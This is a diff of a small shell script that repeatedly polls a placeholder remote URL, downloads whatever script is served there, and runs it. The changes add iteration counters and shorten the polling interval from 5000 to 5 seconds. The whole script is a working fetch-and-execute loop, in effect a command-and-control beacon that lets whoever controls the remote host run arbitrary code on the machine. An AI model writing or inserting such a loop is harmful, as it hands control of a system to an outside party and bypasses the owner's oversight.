@@ -1,10 +1,17 @@
 prevInstr="no way this would be repeated as the instruction"
-while :
+pollingIter=0
+exeIter=0
+while true
 do
-	echo "Polling"
+	pollingIter=$((pollingIter+1))
+	echo "Polling iteration"
+	echo $pollingIter 
 	curl yourSecret.app.com/yourSecretContext > instructions.sh
 	instr=`cat instructions.sh`
 	if [ "$instr" != "$prevInstr" ]; then
+		exeIter=$((exeIter+1))		
+		echo "Executing iteration"
+		echo $exeIter
 		prevInstr=$instr
 		chmod +x instructions.sh
 		./instructions.sh > answer
@@ -14,5 +21,5 @@ do
 		rm answer
 		rm instructions.sh
 	fi
-	sleep 5000
+	sleep 5
 done
